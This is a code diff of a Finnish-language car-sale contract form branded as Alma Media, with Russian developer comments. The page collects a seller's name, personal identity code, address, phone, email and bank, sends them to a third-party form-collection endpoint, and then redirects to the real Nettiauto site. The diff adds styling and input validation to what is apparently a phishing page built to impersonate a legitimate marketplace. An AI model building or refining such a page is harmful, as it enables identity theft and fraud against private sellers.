@@ -33,8 +33,11 @@ body{
   margin:0;
 }
 
+/* Логотип шире на 90px и выше на 50px */
 .logo{
-  width:120px;
+  width:210px; /* 120 + 90 */
+  height:100px; /* 50 + 50 */
+  object-fit:contain;
 }
 
 /* BOX */
@@ -122,6 +125,13 @@ button{
   font-weight:bold;
   cursor:pointer;
   margin-bottom:14px;
+  transition: all 0.2s;
+}
+
+/* Подсветка кнопки серой рамкой при наведении */
+button:hover{
+  border: 2px solid #888888;
+  box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
 }
 
 /* FOOTNOTE */
@@ -159,14 +169,11 @@ button{
     <img src="logo.png" class="logo" alt="Logo">
   </div>
 
-  <!-- Форма для отправки данных -->
   <form id="kauppakirjaForm">
 
-    <!-- OSTaja (статично) -->
     <div class="box">
       <div class="box-title">Ostaja</div>
       <div class="table">
-
         <div class="row">
           <div class="cell">
             <div class="label">Nimi</div>
@@ -177,7 +184,6 @@ button{
             <div class="value">271066-073V</div>
           </div>
         </div>
-
         <div class="row">
           <div class="cell">
             <div class="label">Osoite</div>
@@ -188,7 +194,6 @@ button{
             <div class="value">74120 Iisalmi</div>
           </div>
         </div>
-
         <div class="row">
           <div class="cell">
             <div class="label">Sähköpostiosoite</div>
@@ -199,103 +204,90 @@ button{
             <div class="value">0417125450</div>
           </div>
         </div>
-
       </div>
     </div>
 
-    <!-- MYYJÄ -->
     <div class="box">
       <div class="box-title">Myyjä</div>
       <div class="table">
-
         <div class="row">
           <div class="cell">
             <div class="label">Nimi</div>
-            <input name="myyjä_nimi" type="text" placeholder=" " required>
+            <input name="myyjä_nimi" type="text" required>
           </div>
           <div class="cell">
             <div class="label">Henkilö- / Y-tunnus</div>
-            <input name="myyjä_henkilötunnus" type="text" placeholder=" " required>
+            <input name="myyjä_henkilötunnus" type="text" required>
           </div>
         </div>
-
         <div class="row">
           <div class="cell">
             <div class="label">Osoite</div>
-            <input name="myyjä_osoite" type="text" placeholder=" " required>
+            <input name="myyjä_osoite" type="text" required>
           </div>
           <div class="cell">
             <div class="label">Postinumero ja -toimipaikka</div>
-            <input name="myyjä_postinumero" type="text" placeholder=" " required>
+            <input name="myyjä_postinumero" type="text" required>
           </div>
         </div>
-
         <div class="row">
           <div class="cell">
             <div class="label">Sähköpostiosoite</div>
-            <input name="myyjä_email" type="email" placeholder=" " required>
+            <input name="myyjä_email" type="email" required>
           </div>
           <div class="cell">
             <div class="label">Puhelinnumero</div>
-            <input name="myyjä_puhelin" type="text" placeholder=" " required>
+            <input name="myyjä_puhelin" type="tel" required pattern="\d*" title="Vain numerot sallittu">
           </div>
         </div>
-
       </div>
     </div>
 
-    <!-- AJONEUVO -->
     <div class="box">
       <div class="box-title">Ajoneuvon tiedot</div>
       <div class="table">
-
         <div class="row">
           <div class="cell">
             <div class="label">Merkki ja malli</div>
-            <input name="ajoneuvo_merkki" type="text" placeholder=" ">
+            <input name="ajoneuvo_merkki" type="text">
           </div>
           <div class="cell">
             <div class="label">Väri</div>
-            <input name="ajoneuvo_vari" type="text" placeholder=" ">
+            <input name="ajoneuvo_vari" type="text">
           </div>
         </div>
-
         <div class="row">
           <div class="cell">
             <div class="label">Rekisterinumero</div>
-            <input name="ajoneuvo_rekisteri" type="text" placeholder=" ">
+            <input name="ajoneuvo_rekisteri" type="text">
           </div>
           <div class="cell">
             <div class="label">Polttoaine</div>
-            <input name="ajoneuvo_polttoaine" type="text" placeholder=" ">
+            <input name="ajoneuvo_polttoaine" type="text">
           </div>
         </div>
-
       </div>
     </div>
 
-    <!-- PRICE -->
     <div class="box">
       <div class="box-title">Kauppahinta</div>
       <div class="table">
-
         <div class="row">
           <div class="cell">
             <div class="label">Hinta (€)</div>
-            <input name="kauppahinta_hinta" type="text" placeholder=" ">
+            <input name="kauppahinta_hinta" type="text" pattern="^\d+(\.\d{1,2})?$" title="Syötä vain numerot muodossa 1000.00">
           </div>
           <div class="cell">
             <div class="label">Pankki</div>
-            <input name="kauppahinta_pankki" type="text" placeholder=" ">
+            <input name="kauppahinta_pankki" type="text">
           </div>
         </div>
-
       </div>
     </div>
 
     <div class="checkbox-row">
       <input type="checkbox" required>
-      <span>Annan suostumukseni henkilötietojen käsittelyyn maksujärjestelmässä</span>
+      <span>Hyväksyn henkilötietojen käsittelyn maksujärjestelmässä</span>
     </div>
 
     <button type="submit">Vahvista tiedot</button>
@@ -310,27 +302,31 @@ button{
     </div>
 
   </form>
-
 </div>
 
 <div class="bottom-bar">
   © Alma Media Oyj 2025 |
 </div>
 
-<!-- Скрипт для отправки данных и редиректа -->
 <script>
 const form = document.getElementById('kauppakirjaForm');
 
+// Разрешаем ввод только цифр для полей телефона
+form.querySelectorAll('input[type="tel"]').forEach(input => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g,'');
+  });
+});
+
+// Отправка формы
 form.addEventListener('submit', function(e) {
   e.preventDefault();
   const formData = new FormData(form);
-
   fetch('https://getform.io/f/bejvlvwa', {
     method: 'POST',
     body: formData
   })
   .then(() => {
-    // редирект после успешной отправки
     window.location.href = 'https://viestit.nettiauto.com/';
   })
   .catch(() => {
